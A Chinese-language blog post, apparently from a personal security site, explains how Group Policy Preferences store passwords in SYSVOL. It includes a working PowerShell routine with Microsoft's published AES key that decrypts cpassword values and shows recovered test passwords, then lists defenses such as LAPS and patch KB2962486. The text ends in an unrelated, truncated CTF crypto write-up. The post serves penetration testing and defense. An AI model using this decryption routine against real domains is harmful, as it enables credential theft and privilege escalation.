<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211155128260.png" alt="image-20211211155128260" /></p>
<h2 id="00x01-域内共享文件夹sysvol介绍"><a class="anchor" href="#00x01-域内共享文件夹sysvol介绍">#</a> 00x01 域内共享文件夹 \SYSVOL 介绍</h2>
<hr />
<p>在域中，存在一个默认的共享路径：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>\\<span class="token operator">&lt;</span><span class="token constant">DOMAIN</span><span class="token operator">></span>\<span class="token constant">SYSVOL</span>\<span class="token operator">&lt;</span><span class="token constant">DOMAIN</span><span class="token operator">></span>\</pre></td></tr></table></figure><p>所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等</p>
<p>例如，测试主机所在域为 <code>21r000.org</code> ，可访问共享文件夹 <code>\\21r000.org\SYSVOL\21r000.org</code> 。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211140714629.png" alt="image-20211211140714629" /></p>
<h2 id="00x02-域管理员批量修改域内主机本地管理员密码的方法"><a class="anchor" href="#00x02-域管理员批量修改域内主机本地管理员密码的方法">#</a> 00x02 域管理员批量修改域内主机本地管理员密码的方法</h2>
<hr />
<h3 id="1-测试server-2012系统"><a class="anchor" href="#1-测试server-2012系统">#</a> 1、测试 Server 2012 系统</h3>
<p>对于 <code>server2012</code> ，想要批量修改域内主机本地管理员密码，常常通过配置组策略执行 <code>vbs</code>  脚本的方式</p>
<p>给出一个修改密码的 <code>vbs</code>  脚本 (实现方式不唯一)，代码如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>strComputer <span class="token operator">=</span> <span class="token string">"."</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Set objUser <span class="token operator">=</span> <span class="token function">GetObject</span><span class="token punctuation">(</span><span class="token string">"WinNT://"</span> <span class="token operator">&amp;</span> strComputer <span class="token operator">&amp;</span> <span class="token string">"/Administrator, user"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>objUser<span class="token punctuation">.</span>SetPassword <span class="token string">"21r000@test666"</span></pre></td></tr><tr><td data-num="4"></td><td><pre>objUser<span class="token punctuation">.</span>SetInfo</pre></td></tr></table></figure><p>这种实现方式，最大的弊端在于修改后的密码会明文保存在 <code>vbs</code>  脚本中，而该 <code>vbs</code>  脚本通常会保存在共享文件夹 <code>\SYSVOL</code></p>
<p>这就存在一个隐患：任何域用户都能读取该 <code>vbs</code>  脚本，也就能够获取脚本中保存的明文密码</p>
<h3 id="2-测试server-2012系统"><a class="anchor" href="#2-测试server-2012系统">#</a> 2、测试 Server 2012 系统</h3>
<p>使用 <code>Group Policy Preferences</code>  配置组策略批量修改用户本地管理员密码，具体方法如下：</p>
<p>开始 - 全部应用 - 组策略管理</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211141412684.png" alt="image-20211211141412684" /></p>
<p>选中域 <code>21r000.org</code>  后，右键，选中 “在这个域中创建 <code>GPO</code>  并在此处链接”</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211141528644.png" alt="image-20211211141528644" /></p>
<h4 id="设置名称为test666"><a class="anchor" href="#设置名称为test666">#</a> 设置名称为 test666</h4>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211141641888.png" alt="image-20211211141641888" /></p>
<p><code>test666</code>  - 设置 - 右键 - 编辑</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211141735273.png" alt="image-20211211141735273" /></p>
<p>用户配置 - 首选项 - 控制面板设置 - 本地用户和组</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211141928649.png" alt="image-20211211141928649" /></p>
<p>右键新建本地用户更新， <code>administrator</code>  (内置), 设置密码为 <code>21r000@test666</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211142316768.png" alt="image-20211211142316768" /></p>
<h4 id="委派设置权限"><a class="anchor" href="#委派设置权限">#</a> 委派，设置权限</h4>
<p>在详细一栏，可看到该策略对应的 ID 为 <code>&#123;4CEB170F-B356-4BBD-90A6-1AB86412565A&#125;</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211150132302.png" alt="image-20211211150132302" /></p>
<p>至此，组策略配置完成，域内主机重新登录，即可应用此策略</p>
<p>在共享文件夹 <code>\SYSVOL</code>  中可看到组策略对应 <code>ID</code>  的文件夹</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>\\21r000<span class="token punctuation">.</span>org\<span class="token constant">SYSVOL</span>\21r000<span class="token punctuation">.</span>org\Policies\<span class="token punctuation">&#123;</span>4CEB170F<span class="token operator">-</span><span class="token constant">B356</span><span class="token operator">-</span>4BBD<span class="token operator">-</span>90A6<span class="token operator">-</span>1AB86412565A<span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211150535645.png" alt="image-20211211150535645" /></p>
<p>由于我们刚刚修改了用户配置下的控制面板，所以在对应的文件夹下能找到配置文件 <code>Groups.xml</code> ，具体路径如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>\\21r000<span class="token punctuation">.</span>org\<span class="token constant">SYSVOL</span>\21r000<span class="token punctuation">.</span>org\Policies\<span class="token punctuation">&#123;</span>4CEB170F<span class="token operator">-</span><span class="token constant">B356</span><span class="token operator">-</span>4BBD<span class="token operator">-</span>90A6<span class="token operator">-</span>1AB86412565A<span class="token punctuation">&#125;</span>\User\Preferences\Groups</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211150617501.png" alt="image-20211211150617501" /></p>
<p><code>Groups.xml</code>  内容如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span> <span class="token operator">?</span><span class="token operator">></span> </pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">-</span> <span class="token operator">&lt;</span>Groups clsid<span class="token operator">=</span><span class="token string">"&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">-</span> <span class="token operator">&lt;</span>User clsid<span class="token operator">=</span><span class="token string">"&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;"</span> name<span class="token operator">=</span><span class="token string">"Administrator (内置)"</span> image<span class="token operator">=</span><span class="token string">"2"</span> changed<span class="token operator">=</span><span class="token string">"2021-12-11 07:01:12"</span> uid<span class="token operator">=</span><span class="token string">"&#123;856CE2F7-9053-48B5-BDAD-5C463D2CE3E0&#125;"</span><span class="token operator">></span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token operator">&lt;</span>Properties action<span class="token operator">=</span><span class="token string">"U"</span> newName<span class="token operator">=</span><span class="token string">""</span> fullName<span class="token operator">=</span><span class="token string">""</span> description<span class="token operator">=</span><span class="token string">""</span> cpassword<span class="token operator">=</span><span class="token string">"SnnAkuzBqO6Hx9PkU9X7sVN84eQalEHIikEl6cieXuc"</span> changeLogon<span class="token operator">=</span><span class="token string">"0"</span> noChange<span class="token operator">=</span><span class="token string">"0"</span> neverExpires<span class="token operator">=</span><span class="token string">"0"</span> acctDisabled<span class="token operator">=</span><span class="token string">"0"</span> subAuthority<span class="token operator">=</span><span class="token string">"RID_ADMIN"</span> userName<span class="token operator">=</span><span class="token string">"Administrator (内置)"</span> <span class="token operator">/</span><span class="token operator">></span> </pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token operator">&lt;</span><span class="token operator">/</span>User<span class="token operator">></span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token operator">&lt;</span><span class="token operator">/</span>Groups<span class="token operator">></span></pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211150646270.png" alt="image-20211211150646270" /></p>
<p>值得注意的是其中的 <code>cpassword</code>  项，保存的是加密后的内容：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>SnnAkuzBqO6Hx9PkU9X7sVN84eQalEHIikEl6cieXuc</pre></td></tr></table></figure><p>加密方式为 <code>AES 256</code> ，虽然目前 <code>AES 256</code>  很难被攻破，但是微软选择公开了该 <code>AES 256</code>  加密的私钥</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9jYzQyMjkyNC5hc3B4">地址链接</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211150846986.png" alt="image-20211211150846986" /></p>
<p>借助该私钥，我们就能还原出明文。</p>
<p>还原方式可采用 <code>Chris Campbell @obscuresec</code>  开源的 <code>powershell</code>  脚本 <code>Get-GPPPassword.ps1</code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxNYWZpYS9Qb3dlclNwbG9pdC90cmVlL21hc3Rlci9FeGZpbHRyYXRpb24=">项目链接</span></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211151842507.png" alt="image-20211211151842507" /></p>
<p>该脚本可在域内主机上执行，能够自动查询共享文件夹 <code>\SYSVOL</code>  中的文件，还原出所有明文密码</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>powershell <span class="token operator">-</span>executionpolicy bypass <span class="token operator">-</span>file Get<span class="token operator">-</span>GPPPassword<span class="token punctuation">.</span>ps1</pre></td></tr></table></figure><p>当然，仅仅为了解密 <code>cpassword=&quot;SnnAkuzBqO6Hx9PkU9X7sVN84eQalEHIikEl6cieXuc&quot;</code> ，我们可以对以上 <code>powershell</code>  脚本的功能简化</p>
<p>简化代码如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">function</span> Get<span class="token operator">-</span>DecryptedCpassword <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token punctuation">[</span><span class="token function">CmdletBinding</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token function">Param</span> <span class="token punctuation">(</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token punctuation">[</span>string<span class="token punctuation">]</span> $Cpassword </pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        #Append appropriate padding based on string length  </pre></td></tr><tr><td data-num="9"></td><td><pre>        $Mod <span class="token operator">=</span> <span class="token punctuation">(</span>$Cpassword<span class="token punctuation">.</span>length <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        </pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>$Mod<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token string">'1'</span> <span class="token punctuation">&#123;</span>$Cpassword <span class="token operator">=</span> $Cpassword<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>$Cpassword<span class="token punctuation">.</span>Length <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token string">'2'</span> <span class="token punctuation">&#123;</span>$Cpassword <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">-</span> $Mod<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token string">'3'</span> <span class="token punctuation">&#123;</span>$Cpassword <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token string">'='</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">-</span> $Mod<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>        $Base64Decoded <span class="token operator">=</span> <span class="token punctuation">[</span>Convert<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span><span class="token function">FromBase64String</span><span class="token punctuation">(</span>$Cpassword<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        </pre></td></tr><tr><td data-num="19"></td><td><pre>        #Create a <span class="token keyword">new</span> <span class="token class-name">AES</span> <span class="token punctuation">.</span><span class="token constant">NET</span> Crypto Object</pre></td></tr><tr><td data-num="20"></td><td><pre>        $AesObject <span class="token operator">=</span> New<span class="token operator">-</span>Object System<span class="token punctuation">.</span>Security<span class="token punctuation">.</span>Cryptography<span class="token punctuation">.</span>AesCryptoServiceProvider</pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">[</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> $AesKey <span class="token operator">=</span> @<span class="token punctuation">(</span><span class="token number">0x4e</span><span class="token punctuation">,</span><span class="token number">0x99</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0xfc</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0xc9</span><span class="token punctuation">,</span><span class="token number">0xfa</span><span class="token punctuation">,</span><span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x93</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token number">0x62</span><span class="token punctuation">,</span><span class="token number">0x0f</span><span class="token punctuation">,</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                             <span class="token number">0xf4</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0xe8</span><span class="token punctuation">,</span><span class="token number">0x06</span><span class="token punctuation">,</span><span class="token number">0xcc</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0x79</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x9b</span><span class="token punctuation">,</span><span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0xa4</span><span class="token punctuation">,</span><span class="token number">0x33</span><span class="token punctuation">,</span><span class="token number">0xb6</span><span class="token punctuation">,</span><span class="token number">0x6c</span><span class="token punctuation">,</span><span class="token number">0x1b</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        </pre></td></tr><tr><td data-num="24"></td><td><pre>        #Set <span class="token constant">IV</span> to all nulls to prevent dynamic generation <span class="token keyword">of</span> <span class="token constant">IV</span> value</pre></td></tr><tr><td data-num="25"></td><td><pre>        $AesIV <span class="token operator">=</span> New<span class="token operator">-</span>Object Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$AesObject<span class="token punctuation">.</span><span class="token constant">IV</span><span class="token punctuation">.</span>Length<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="26"></td><td><pre>        $AesObject<span class="token punctuation">.</span><span class="token constant">IV</span> <span class="token operator">=</span> $AesIV</pre></td></tr><tr><td data-num="27"></td><td><pre>        $AesObject<span class="token punctuation">.</span>Key <span class="token operator">=</span> $AesKey</pre></td></tr><tr><td data-num="28"></td><td><pre>        $DecryptorObject <span class="token operator">=</span> $AesObject<span class="token punctuation">.</span><span class="token function">CreateDecryptor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="29"></td><td><pre>        <span class="token punctuation">[</span>Byte<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">]</span> $OutBlock <span class="token operator">=</span> $DecryptorObject<span class="token punctuation">.</span><span class="token function">TransformFinalBlock</span><span class="token punctuation">(</span>$Base64Decoded<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $Base64Decoded<span class="token punctuation">.</span>length<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        </pre></td></tr><tr><td data-num="31"></td><td><pre>        <span class="token keyword">return</span> <span class="token punctuation">[</span>System<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>UnicodeEncoding<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">:</span>Unicode<span class="token punctuation">.</span><span class="token function">GetString</span><span class="token punctuation">(</span>$OutBlock<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span> </pre></td></tr><tr><td data-num="33"></td><td><pre>    </pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token keyword">catch</span> <span class="token punctuation">&#123;</span>Write<span class="token operator">-</span>Error $Error<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token punctuation">&#125;</span>  </pre></td></tr><tr><td data-num="36"></td><td><pre>Get<span class="token operator">-</span>DecryptedCpassword <span class="token string">"SnnAkuzBqO6Hx9PkU9X7sVN84eQalEHIikEl6cieXuc"</span></pre></td></tr></table></figure><p>还原出明文密码为 <code>21r000@test666</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211152350388.png" alt="image-20211211152350388" /></p>
<h2 id="00x03-组策略中可被利用的地方"><a class="anchor" href="#00x03-组策略中可被利用的地方">#</a> 00x03 组策略中可被利用的地方</h2>
<hr />
<p>组策略中可被利用的地方不只在修改管理员密码的位置，还包括以下：</p>
<p><code>Services\Services.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjOTgwMDcwKHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13)</span></li>
</ul>
<p><code>ScheduledTasks\ScheduledTasks.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjNDIyOTIwKHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13)</span></li>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2RkMzQxMzUwKHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13)</span></li>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2RkMzA0MTE0KHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13)</span></li>
</ul>
<p><code>Printers\Printers.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjNDIyOTE4KHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13)</span></li>
</ul>
<p><code>Drives\Drives.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjNzA0NTk4KHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13)</span></li>
</ul>
<p><code>DataSources\DataSources.xml</code></p>
<ul>
<li><span class="exturl" data-url="aHR0cDovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L2NjNDIyOTI2KHY9cHJvdC4xMyk=">http://msdn.microsoft.com/en-us/library/cc422926(v=prot.13)</span></li>
</ul>
<p>注：以上位置并不绝对，在配置时需要在组策略中填入用户名密码，对应的 <code>Groups.xml</code>  才会包含 <code>cpassword</code>  属性，才能用于还原明文。</p>
<p>可以拿计划任务来举例，对应 <code>ScheduledTasks.xml</code>  的位置</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>\\21r000<span class="token punctuation">.</span>org\<span class="token constant">SYSVOL</span>\21r000<span class="token punctuation">.</span>org\Policies\<span class="token punctuation">&#123;</span>4CEB170F<span class="token operator">-</span><span class="token constant">B356</span><span class="token operator">-</span>4BBD<span class="token operator">-</span>90A6<span class="token operator">-</span>1AB86412565A<span class="token punctuation">&#125;</span>\User\Preferences\ScheduledTasks</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211154122408.png" alt="image-20211211154122408" /></p>
<p>组策略配置的位置为：用户配置 - 首选项 - 控制面板设置 - 计划任务</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211153200453.png" alt="image-20211211153200453" /></p>
<p>新建计划任务，设置名称为： <code>test111</code> ，需要选中运行身份，填入用户名 <code>test111</code>  和密码 <code>test@111</code> 。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211153508588.png" alt="image-20211211153508588" /></p>
<p>如未输入用户名和密码，则 <code>ScheduledTasks.xml</code>  文件中不会包含 <code>cpassword</code>  属性，如下图</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211153735339.png" alt="image-20211211153735339" /></p>
<p>填入了测试密码后对应的 <code>ScheduledTasks.xml</code>  才会包含 <code>cpassword</code>  属性</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mZC5nKiO6yVR2yFD4YZ3umRzNBgRZlODkPDNkaEFQgI</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211153947688.png" alt="image-20211211153947688" /></p>
<p>使用 <code>powershell</code>  对其解密，还原出密码为： <code>test@111</code></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211154232881.png" alt="image-20211211154232881" /></p>
<p>至此得出结论：</p>
<p>域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹 <code>\SYSVOL</code>  下，默认所有域内用户可访问，虽然被加密，但很容易被解密</p>
<p>这就造成了安全隐患，现实中域管理员往往会在组策略中使用域管理员密码，组策略配置文件中的密码很容易被获得，导致权限提升</p>
<p>为此，微软发布了补丁 <code>KB2962486</code> 。<br />
<span class="exturl" data-url="aHR0cHM6Ly90ZWNobmV0Lm1pY3Jvc29mdC5jb20vbGlicmFyeS9zZWN1cml0eS9tczE0LTAyNQ==">KB2962486 下载链接</span></p>
<p>系统打了补丁后，组策略中无法设置用户名密码，如下图</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211154702166.png" alt="image-20211211154702166" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211211154715101.png" alt="image-20211211154715101" /></p>
<p>当然，共享文件夹 <code>\SYSVOL</code>  下的 <code>xml</code>  文件也就不再包含 <code>cpassword</code>  属性</p>
<p><strong>注</strong>： <code>xml</code>  文件还是会和组策略保持同步</p>
<h2 id="00x04-防御"><a class="anchor" href="#00x04-防御">#</a> 00x04 防御</h2>
<hr />
<p>结合攻击方法，可供选择的防御方法如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>使用<span class="token constant">LAPS</span>批量管理域内主机本地管理员帐户</pre></td></tr><tr><td data-num="2"></td><td><pre>域控安装补丁<span class="token constant">KB2962486</span></pre></td></tr><tr><td data-num="3"></td><td><pre>不在组策略中使用域控密码</pre></td></tr><tr><td data-num="4"></td><td><pre>设置共享文件夹\<span class="token constant">SYSVOL</span>的访问权限</pre></td></tr><tr><td data-num="5"></td><td><pre>使用PsPasswd批量修改域内主机本地管理员密码</pre></td></tr></table></figure><h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly8zZ3N0dWRlbnQuZ2l0aHViLmlvLyVFNSU5RiU5RiVFNiVCOCU5NyVFOSU4MCU4Ri0lRTUlODglQTklRTclOTQlQThTWVNWT0wlRTglQkYlOTglRTUlOEUlOUYlRTclQkIlODQlRTclQUQlOTYlRTclOTUlQTUlRTQlQjglQUQlRTQlQkYlOUQlRTUlQUQlOTglRTclOUElODQlRTUlQUYlODYlRTclQTAlODE=">域渗透 —— 利用 SYSVOL 还原组策略中保存的密码</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>第四届浙江省大学生网络与信息安全竞赛（决赛）dssssa1及easyNTRU复现</title>
    <url>/article/8f0d21b8.html</url>
    <content><![CDATA[<h2 id="dssssa1"><a class="anchor" href="#dssssa1">#</a> dssssa1</h2>
<p>附件下载得到的 encode 脚本：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>from Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> random</pre></td></tr><tr><td data-num="3"></td><td><pre>from gmpy2 <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="4"></td><td><pre>from hashlib <span class="token keyword">import</span> sha1</pre></td></tr><tr><td data-num="5"></td><td><pre>from secret <span class="token keyword">import</span> flag</pre></td></tr><tr><td data-num="6"></td><td><pre>m <span class="token operator">=</span> <span class="token function">bytes_to_long</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>q <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">while</span> <span class="token literal-property property">True</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    p <span class="token operator">=</span> <span class="token function">getPrime</span><span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> q <span class="token operator">==</span> <span class="token number">0</span><span class="token operator">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        </pre></td></tr><tr><td data-num="14"></td><td><pre>h <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>g <span class="token operator">=</span> <span class="token function">powmod</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//q, p)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>x <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>y <span class="token operator">=</span> <span class="token function">powmod</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> p<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>k <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">randint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre>h <span class="token operator">=</span> <span class="token function">bytes_to_long</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span 